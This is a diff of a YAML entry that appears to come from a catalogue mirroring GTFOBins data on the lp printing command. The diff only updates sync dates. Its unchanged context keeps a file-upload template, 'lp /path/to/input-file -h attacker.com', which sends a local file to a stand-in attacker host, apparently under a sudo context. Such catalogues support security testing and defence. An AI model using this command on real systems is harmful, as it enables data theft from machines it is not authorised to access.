@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd5246
-  last_synced: '2026-08-28'
+  last_synced: '2026-08-29'
 commands:
 - template: lp /path/to/input-file -h attacker.com
   comment: 'This requires `cups` to be installed. Run the following on the attacker box beforehand:
@@ -38,7 +38,7 @@ source_data:
       context: sudo
     upstream_url: https://gtfobins.github.io/gtfobins/lp/
     upstream_version: acd5246
-    last_synced: '2026-08-28'
+    last_synced: '2026-08-29'
 enrichment:
   capabilities:
   - value: file-upload
@@ -74,6 +74,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-08-28'
+  projected_at: '2026-08-29'
   source_hashes:
     GTFOBins: sha256:083972b92326ad2dc1461ccd050c036121a0e1556c35bc2c9a16d49bfe14093b
